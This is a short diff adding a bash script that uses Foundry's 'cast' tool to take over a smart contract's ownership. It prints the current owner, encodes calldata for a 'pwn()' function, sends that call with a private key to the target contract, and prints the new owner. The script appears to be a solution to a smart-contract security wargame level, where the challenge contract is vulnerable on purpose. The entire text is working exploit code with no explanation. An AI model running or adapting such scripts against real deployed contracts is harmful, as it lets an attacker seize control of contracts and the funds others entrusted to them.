@@ -1,0 +1,10 @@
+#!/bin/bash
+echo current owner is:
+cast call $CONTRACT_ADDRESS 'owner()(address)'
+echo making pwn msg data
+PWN_CALLDATA=$(cast calldata 'pwn()')
+echo $PWN_CALLDATA
+echo sending pwn data to contract
+cast send --private-key $PRIVATE_KEY --gas 100000 $CONTRACT_ADDRESS $PWN_CALLDATA
+echo new owner is:
+cast call $CONTRACT_ADDRESS 'owner()(address)'
